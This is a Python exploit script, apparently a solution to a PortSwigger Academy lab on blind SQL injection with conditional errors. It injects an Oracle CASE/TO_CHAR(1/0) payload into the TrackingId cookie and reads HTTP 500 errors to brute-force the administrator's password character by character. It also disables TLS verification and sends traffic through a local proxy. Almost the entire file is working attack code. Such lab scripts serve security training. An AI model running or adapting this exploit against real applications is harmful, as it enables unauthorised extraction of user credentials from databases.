#!/usr/bin/python

import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Blind SQL injection with conditional errors')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload ="' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = { 'session': 'XELSCR8PrJi5EsxrQDPYfG3s35icl7XI', 'TrackingId': 'SBigBz63tViF9Xsd' + sqli_payload_encoded}
            response = requests.get(url, cookies=cookies,verify=False, proxies=proxies)
            if response.status_code == 500:
                password_extracted +=chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s <url>" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    output.info("Retrieving administrator password..")
    sqli_password(url)

if __name__ == "__main__":
    main()
